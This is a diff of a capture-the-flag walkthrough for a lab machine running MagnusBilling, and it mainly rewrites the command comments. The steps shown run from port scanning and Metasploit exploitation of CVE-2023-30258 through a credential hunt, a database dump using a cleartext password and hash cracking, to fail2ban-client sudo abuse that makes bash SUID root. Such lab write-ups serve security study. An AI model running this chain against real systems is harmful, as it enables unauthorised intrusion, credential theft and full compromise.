@@ -51,8 +51,8 @@ cat /root/root.txt
 Full TCP sweep, then service detection on the open ports:
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port scan and service enumeration.
+# Why here: identify the attack surface, specifically the MagnusBilling instance and Asterisk AMI port.
 nmap -sS -p- -n -Pn $TARGET
 nmap -sVC -p22,80,3306,5038 $TARGET -oA service
 ```
@@ -80,21 +80,21 @@ Browser hits `/mbilling/` ? the MagnusBilling login page. No credentials needed;
 Directory brute just to confirm the app layout (optional):
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: brute-force directories under /mbilling/.
+# Why here: map the application structure and identify potential sensitive files within MagnusBilling.
 feroxbuster -u http://$TARGET/mbilling/ \
-  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 ```
 
 ---
 
-## 3. Initial Access  MagnusBilling CVE-2023-30258
+## 3. Initial Access — MagnusBilling CVE-2023-30258
 
 Metasploit ships the exploit module. Full playbook in [magnusbilling-rce.md](../../exploits/web-rce/magnusbilling-rce.md).
 
 ```bash
-# What it does: usa herramientas de Metasploit para preparar exploit o payload.
-# Why here: generar o lanzar el payload necesario.
+# What it does: launch the MagnusBilling unauth RCE exploit via Metasploit.
+# Why here: exploit CVE-2023-30258 to obtain an initial foothold on the target as the asterisk user.
 msfconsole
 search magnusbilling
 use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
@@ -110,8 +110,8 @@ Drops a **meterpreter as `asterisk`**. Stabilise the shell immediately:
 shell
 bash -i
 export TERM=xterm-256color
-# What it does: executes a Windows command line action.
-# Why here: enumerate, transfer, replace or validate artifacts on the victim.
+# What it does: verify the current user identity in the meterpreter shell.
+# Why here: confirm that the exploit landed successfully and we are running as 'asterisk'.
 whoami          # asterisk
 id
 uname -a
@@ -127,8 +127,8 @@ First pass of the [Linux enumeration playbook](../../exploits/enumeration/linux-
 ```bash
 id
 uname -a
-# What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# What it does: check the 'asterisk' user's sudo permissions.
+# Why here: identify the fail2ban-client NOPASSWD entry for privilege escalation.
 sudo -l
 # User asterisk may run the following commands on HOST:
 #     (root) NOPASSWD: /usr/bin/fail2ban-client
@@ -140,9 +140,8 @@ sudo -l
 ### Credential hunt on disk
 
 ```bash
-# Any file referencing MySQL connection helpers
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for common database connection strings.
+# Why here: identify application code or scripts that contain hardcoded database credentials.
 find / -type f -exec grep -l -i "mysql_connect\|mysqli_connect\|PDO\|DB_PASSWORD\|MYSQL_PASSWORD" {} \; 2>/dev/null
 
 # Config files with cleartext passwords
@@ -162,8 +161,8 @@ The high-signal hit:
 ```
 
 ```bash
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the Asterisk MySQL configuration.
+# Why here: recover the cleartext database credentials for the 'mbilling' user.
 cat /etc/asterisk/res_config_mysql.conf
 # dbhost = localhost
 # dbname = mbilling
@@ -182,16 +181,16 @@ Remote MySQL is filtered (confirmed by `mysql -h $TARGET -u mbillingUser --passw
 
 ### Full dump
 ```bash
-# What it does: usa un cliente o herramienta de volcado de base de datos.
-# Why here: enumerar datos y extraer credenciales o estado de la app.
+# What it does: dump the entire 'mbilling' database.
+# Why here: extract user hashes, SIP secrets, and SMTP credentials for further lateral movement or looting.
 mysqldump -u mbillingUser -p'BLOGYwvtJkI7uaX5' mbilling > /tmp/mbilling_backup.sql
 ```
 
 ### Target the interesting tables
 ```bash
 # Admin / operator accounts (SHA-1 hashes)
-# What it does: usa un cliente o herramienta de volcado de base de datos.
-# Why here: enumerar datos y extraer credenciales o estado de la app.
+# What it does: query the user table for SHA-1 hashes.
+# Why here: isolate the root/admin hashes for cracking attempts.
 mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -D mbilling -e "SELECT * FROM pkg_user;" > /tmp/usuarios.txt
 
 # Remote Asterisk servers
@@ -220,8 +219,8 @@ root : d8c55b020bca07272d4cf3a46d693bb6ebafe3e1
 Raw SHA-1 ? hashcat mode 100:
 
 ```bash
-# What it does: cracks hashes with the specified mode and wordlist.
-# Why here: recuperar credenciales o confirmar que no estan en la lista.
+# What it does: attempt to crack the admin SHA-1 hash with Hashcat.
+# Why here: recover the administrative password for MagnusBilling if present in rockyou.txt.
 hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -243,8 +242,8 @@ Full technique note: [fail2ban-sudo-privesc.md](../../exploits/privesc-linux/fai
 
 ```bash
 # 1. Hijack the sshd jail's ban action
-# What it does: modifica o dispara fail2ban via sudo.
-# Why here: abusar el cliente administrativo permitido para ejecutar acciones como root.
+# What it does: hijack the sshd jail's ban action using fail2ban-client.
+# Why here: inject a SUID bash payload into the root-run fail2ban action logic.
 sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
   actionban "chmod +s /bin/bash"
 
@@ -252,16 +251,16 @@ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
 sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.4
 
 # 3. Verify bash is now SUID root
-# What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# What it does: verify the SUID bit on the bash binary.
+# Why here: confirm that the fail2ban action successfully escalated privileges.
 ls -la /bin/bash
 # -rwsr-xr-x 1 root root ... /bin/bash
 
 # 4. Get a privileged shell
 bash -p
-# What it does: executes a Windows command line action.
-# Why here: enumerate, transfer, replace or validate artifacts on the victim.
-whoami          # root
+# What it does: check the final root identity.
+# Why here: confirm successful privilege escalation through the fail2ban-client exploit.
+whoami
 id
 ```
 
@@ -270,10 +269,10 @@ id
 ## 7. Root Flag
 
 ```bash
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the root flag and sensitive logs.
+# Why here: confirm full compromise and gather additional loot for post-exploitation.
 cat /root/root.txt
-cat /root/passwordMysql.log     # dropped during setup, another loot file
+cat /root/passwordMysql.log
 ```
 
 ---
